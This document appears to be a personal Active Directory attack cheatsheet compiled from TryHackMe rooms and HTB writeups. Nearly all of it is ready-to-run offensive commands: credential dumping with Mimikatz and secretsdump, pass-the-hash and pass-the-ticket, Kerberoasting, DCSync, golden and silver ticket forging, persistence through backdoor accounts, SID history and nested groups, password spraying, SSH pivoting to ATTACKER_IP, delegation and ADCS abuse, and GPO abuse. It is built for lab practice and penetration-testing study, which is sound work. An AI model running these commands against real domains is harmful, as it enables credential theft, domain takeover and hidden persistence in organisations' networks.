---
title: "Active Directory Cheatsheet"
type: cheatsheet
tags: [active-directory, adcs, cheatsheet, delegation, enumeration, kerberos, lateral-movement, pass-the-hash, persistence, rbcd, thm, windows]
date_created: 2026-05-08
date_updated: 2026-05-13
sources: [thm-ad-breaching, thm-ad-lateral, thm-ad-persistence, thm-ad-enumeration, git-htb-writeups]
---

# Active Directory Cheatsheet

---

## Enumeration — Built-in Commands

```cmd
# List all domain users
net user /domain

# Inspect a specific user
net user zoe.marshall /domain

# List all domain groups
net group /domain

# List members of a group
net group "Domain Admins" /domain

# Password policy (lockout threshold, complexity, min age)
net accounts /domain

# List domain computers
net view /domain
```

---

## Enumeration — PowerShell AD Module (RSAT)

```powershell
# Import module (if available)
Import-Module ActiveDirectory

# Enumerate user (all properties)
Get-ADUser -Identity john.smith -Server dc.domain.local -Properties *

# Search users by pattern
Get-ADUser -Filter 'Name -like "*smith"' | Format-Table Name,SamAccountName -A

# All users in a group
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# All groups a user belongs to
Get-ADPrincipalGroupMembership -Identity john.smith

# Enumerate computers
Get-ADComputer -Filter * -Properties DNSHostName,OperatingSystem | Select Name,DNSHostName,OperatingSystem

# SID of a group
Get-ADGroup "Domain Admins" | Select SID

# SID history of a user
Get-ADUser john.smith -Properties SIDHistory | Select SIDHistory

# Domain info (SID, FQDN, PDC)
Get-ADDomain
```

---

## Enumeration — PowerView

```powershell
# Load PowerView
. .\PowerView.ps1

# Domain info
Get-NetDomain
Get-NetDomainController

# Users
Get-NetUser | Select samaccountname, description, memberof
Get-NetUser -SPN | Select samaccountname, serviceprincipalname    # Kerberoastable

# Groups
Get-NetGroup -GroupName "Domain Admins"
Get-NetGroupMember -GroupName "Domain Admins" -Recurse

# Computers
Get-NetComputer | Select dnshostname, operatingsystem

# ACL on an object (look for WriteDACL, GenericAll, ForceChangePassword, AddMember)
Get-ObjectAcl -SamAccountName krbtgt -ResolveGUIDs | Select ActiveDirectoryRights,SecurityIdentifier

# Find shares
Find-DomainShare -CheckShareAccess

# Local admin access
Find-LocalAdminAccess
```

---

## Enumeration — BloodHound / SharpHound

```powershell
# Collect all AD data (run on domain-joined host)
.\SharpHound.exe -c All --outputdirectory C:\tmp\

# Import zip into BloodHound GUI, then query:
# "Find Shortest Paths to Domain Admins"
# "Find Principals with DCSync Rights"
# "Kerberoastable Accounts"
```

From Linux (bloodhound-python):
```bash
bloodhound-python -u user -p password -d domain.local -ns DC_IP -c All
```

---

## Lateral Movement — WinRM

```bash
# Linux
evil-winrm -i TARGET_IP -u user -p password
evil-winrm -i TARGET_IP -u user -H NTLM_HASH       # Pass-the-Hash
```

```powershell
# Windows — interactive session
$cred = Get-Credential
Enter-PSSession -ComputerName TARGET -Credential $cred

# Windows — run command
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }
```

---

## Lateral Movement — Remote Process / Service

```cmd
# PsExec (Sysinternals)
psexec64.exe \\TARGET -u Administrator -p Pass123 -i cmd.exe

# SC — create and start a service
sc.exe \\TARGET create svc1 binPath= "net user backdoor Pass123 /add" start= auto
sc.exe \\TARGET start svc1
sc.exe \\TARGET stop svc1
sc.exe \\TARGET delete svc1

# Scheduled task
schtasks /s TARGET /RU "SYSTEM" /create /tn "mytask" /tr "cmd.exe /c whoami > C:\out.txt" /sc ONCE /sd 01/01/1970 /st 00:00
schtasks /s TARGET /run /TN "mytask"
schtasks /S TARGET /TN "mytask" /DELETE /F
```

---

## Lateral Movement — WMI

```powershell
# Build session
$cred = New-Object System.Management.Automation.PSCredential("Administrator", (ConvertTo-SecureString "Pass123" -AsPlainText -Force))
$Opt  = New-CimSessionOption -Protocol DCOM
$Sess = New-CimSession -ComputerName TARGET -Credential $cred -SessionOption $Opt

# Spawn process
Invoke-CimMethod -CimSession $Sess -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami > C:\out.txt"}
```

```cmd
# Legacy wmic
wmic.exe /user:Admin /password:Pass123 /node:TARGET process call create "cmd.exe /c whoami"
```

---

## Pass-the-Hash

### Extract Hashes

```
# Mimikatz — from SAM (local users)
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam

# Mimikatz — from LSASS (domain users who logged on)
mimikatz # sekurlsa::msv

# Registry hives (offline — requires admin)
reg.exe save hklm\sam   C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# Parse offline with secretsdump
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# Remote SAM/LSA dump (requires local admin creds)
netexec smb TARGET_IP --local-auth -u admin -p Pass123 --sam
netexec smb TARGET_IP --local-auth -u admin -p Pass123 --lsa
```

### Use Hashes

```bash
# Impacket
psexec.py  -hashes :NTLM_HASH DOMAIN/user@TARGET_IP
wmiexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP
smbexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP

# Evil-WinRM
evil-winrm -i TARGET_IP -u user -H NTLM_HASH

# RDP
xfreerdp /v:TARGET_IP /u:DOMAIN\\user /pth:NTLM_HASH

# CrackMapExec / NetExec
crackmapexec smb TARGET_IP -u user -H NTLM_HASH
crackmapexec smb 10.10.10.0/24 -u user -H NTLM_HASH   # subnet spray
netexec smb TARGET_IP -u user -H NTLM_HASH
```

```
# Mimikatz — inject hash for current session (spawns new process)
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob /domain:domain.local /ntlm:NTLM_HASH /run:"cmd.exe"
```

---

## Pass-the-Ticket

```
# Extract all tickets from LSASS (requires SYSTEM/admin)
mimikatz # sekurlsa::tickets /export

# Inject a ticket into the current session
mimikatz # kerberos::ptt [ticket_file].kirbi

# Verify loaded tickets
klist
```

Using Rubeus:
```cmd
# Request TGT and inject it
Rubeus.exe asktgt /user:Administrator /password:Pass123 /ptt

# Request TGT with certificate
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:cert.pfx /password:CertPass /ptt /domain:domain.local /dc:DC_IP
```

---

## Kerberoasting

```bash
# Linux — Impacket
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -outputfile tgs.hash
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt

# Linux — with hash (no plaintext password)
GetUserSPNs.py -hashes :NTLM_HASH DOMAIN/user@DC_IP
```

```powershell
# Windows — Rubeus
Rubeus.exe kerberoast /outfile:tgs.hash /format:hashcat
```

```powershell
# PowerView
Get-NetUser -SPN | Select samaccountname, serviceprincipalname
Request-SPNTicket -SPN "MSSQLSvc/sql01.domain.local:1433" -Format hashcat
```

---

## AS-REP Roasting

Targets accounts with "Do not require Kerberos preauthentication" enabled:

```bash
# Linux — Impacket
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

```cmd
# Windows — Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash
```

---

## DCSync

Replicate AD credentials as if you were a DC (requires Replicating Directory Changes All permission — typically Domain Admin):

```
# Mimikatz
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /all

# Impacket
secretsdump.py -just-dc DOMAIN/user:password@DC_IP
secretsdump.py -just-dc-user krbtgt DOMAIN/user:password@DC_IP
```

---

## Golden Ticket

```
# 1. Get krbtgt hash
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# 2. Get Domain SID
Get-ADDomain | Select DomainSID

# 3. Forge and inject golden ticket
mimikatz # kerberos::golden /admin:FakeAdmin /domain:domain.local /id:500 /sid:S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX /krbtgt:KRBTGT_HASH /endin:600 /renewmax:10080 /ptt

# 4. Verify
dir \\dc.domain.local\C$
```

---

## Silver Ticket

```
# Forge TGS for a specific service using machine account hash
mimikatz # kerberos::golden /admin:FakeAdmin /domain:domain.local /id:500 /sid:S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX /target:server.domain.local /rc4:MACHINE_NTLM_HASH /service:cifs /endin:600 /renewmax:10080 /ptt

# Access the service
dir \\server.domain.local\C$
```

Common services: `cifs` (SMB), `host` (remote task/WMI), `http` (IIS/WinRM), `mssql`

---

## Persistence — ACL / AdminSDHolder

```powershell
# Manually trigger SDProp (propagates AdminSDHolder ACL to all protected groups)
Import-Module .\Invoke-ADSDPropagation.ps1
Invoke-ADSDPropagation

# Add user to Domain Admins after ACL propagation
Add-ADGroupMember -Identity "Domain Admins" -Members backdooruser
```

---

## Persistence — SID History Injection

```powershell
# On DC — stop NTDS, patch ntds.dit, restart NTDS
Stop-Service -Name ntds -force
Add-ADDBSidHistory -SamAccountName 'lowprivuser' -SidHistory 'S-1-5-21-...-512' -DatabasePath C:\Windows\NTDS\ntds.dit
Start-Service -Name ntds

# Verify
Get-ADUser lowprivuser -Properties SIDHistory
```

---

## Persistence — Nested Groups

```powershell
# Create chain of groups, add last one to Domain Admins, add user to first
Add-ADGroupMember -Identity 'Domain Admins' -Members 'backdoor_grp5'
Add-ADGroupMember -Identity 'backdoor_grp1' -Members 'lowprivuser'

# Query Domain Admins — only shows backdoor_grp5, not the chain or user
Get-ADGroupMember -Identity "Domain Admins"
```

---

## Credential Spraying

```bash
# CrackMapExec / NetExec — spray one password across many users
crackmapexec smb DC_IP -u users.txt -p 'Password123' --continue-on-success
netexec smb DC_IP -u users.txt -p 'Password123'

# Kerbrute — username enumeration + spray
kerbrute userenum --dc DC_IP --domain domain.local names.txt
kerbrute passwordspray --dc DC_IP --domain domain.local users.txt 'Password123'
```

---

## Port Forwarding for AD Attacks

```bash
# SSH remote port forward (pivot forwards DC's port 445 to attacker)
ssh tunneluser@ATTACKER_IP -R 445:DC_IP:445 -N

# SOCKS proxy via SSH (run tools through proxychains)
ssh tunneluser@ATTACKER_IP -R 9050 -N
proxychains netexec smb TARGET_IP -u user -p pass

# Socat (no SSH available on pivot)
socat TCP4-LISTEN:445,fork TCP4:DC_IP:445
```

---

## Enumeration — LDAP / SMB (NetExec / ldapsearch)

```bash
# NetExec (nxc) — comprehensive enumeration
nxc smb 10.10.10.X -u '' -p '' --shares           # null session shares
nxc smb 10.10.10.X -u user -p pass --shares
nxc smb 10.10.10.X -u '' -p '' --rid-brute         # RID brute → user list
nxc smb 10.10.10.X -u user -p pass -M spider_plus  # spider shares for creds

nxc ldap 10.10.10.X -u user -p pass -d domain.htb --users
nxc ldap 10.10.10.X -u user -p pass -d domain.htb --groups

# NetExec BloodHound collection
nxc ldap 10.10.10.X -u user -p pass -d domain.htb --bloodhound -ns 10.10.10.X --collection All

# ldapsearch
ldapsearch -x -H ldap://10.10.10.X -b "DC=domain,DC=htb"                              # anonymous
ldapsearch -x -H ldap://10.10.10.X -D "user@domain.htb" -w 'pass' -b "DC=domain,DC=htb" "(objectClass=user)" sAMAccountName
ldapsearch -x -H ldap://10.10.10.X -D "user@domain.htb" -w 'pass' -b "DC=domain,DC=htb" "(objectClass=computer)" name

# enum4linux-ng
enum4linux-ng -A 10.10.10.X
```

---

## Delegation Attacks

### Unconstrained Delegation

```bash
# Find computers with unconstrained delegation
impacket-findDelegation domain.htb/user:pass -dc-ip 10.10.10.X

# Monitor for TGTs arriving (Rubeus on Windows)
.\Rubeus.exe monitor /interval:5 /nowrap

# Coerce authentication to trigger TGT capture
python3 printerbug.py domain.htb/user:pass@TARGET_DC 10.10.10.LISTENER
python3 PetitPotam.py 10.10.10.LISTENER 10.10.10.DC
```

### Constrained Delegation

```bash
# Request service ticket impersonating admin
impacket-getST -spn cifs/target.domain.htb -impersonate administrator domain.htb/svc_account:pass

# Use the ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.htb/administrator@target.domain.htb
```

### Resource-Based Constrained Delegation (RBCD)

```bash
# 1. Add attacker-controlled computer account
impacket-addcomputer domain.htb/user:pass -computer-name 'FAKE01$' -computer-pass 'FakePass123!'

# 2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on target
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -action write domain.htb/user:pass

# 3. Get service ticket impersonating administrator
impacket-getST -spn cifs/target.domain.htb -impersonate administrator domain.htb/'FAKE01$':'FakePass123!'

# 4. Use ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.htb/administrator@target.domain.htb
```

---

## ADCS Attacks (Certipy)

```bash
# Enumerate certificate templates
certipy find -u user@domain.htb -p 'pass' -dc-ip 10.10.10.X

# ESC1 — enrollee supplies subject alternative name
certipy req -u user@domain.htb -p 'pass' -ca CA-NAME -template TEMPLATE -upn administrator@domain.htb

# ESC4 — writable template ACL (save old config first)
certipy template -u user@domain.htb -p 'pass' -template TEMPLATE -save-old
# Then request as ESC1

# ESC8 — NTLM relay to ADCS HTTP endpoint
certipy relay -ca ca.domain.htb -template DomainController

# Authenticate with obtained certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.X
```

---

## GPO Abuse

```powershell
# SharpGPOAbuse — add local admin via GPO
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount user --GPOName "Default Domain Policy"

# pyGPOAbuse (Linux)
python3 pygpoabuse.py domain.htb/user:pass -gpo-id "GPO-GUID" -command 'net localgroup administrators user /add' -f
```

---

## Quick Reference — Key Ports

| Port | Protocol | Use |
|------|----------|-----|
| 88 | Kerberos | TGT/TGS requests |
| 135 | RPC/DCE | WMI, SC.exe |
| 139/445 | SMB | PsExec, shares |
| 389/636 | LDAP/LDAPS | Directory queries |
| 3268/3269 | Global Catalog | Forest-wide LDAP |
| 3389 | RDP | Remote desktop |
| 5985/5986 | WinRM | Evil-WinRM, PS remoting |
| 49152-65535 | DCE/RPC dynamic | WMI, SC.exe fallback |
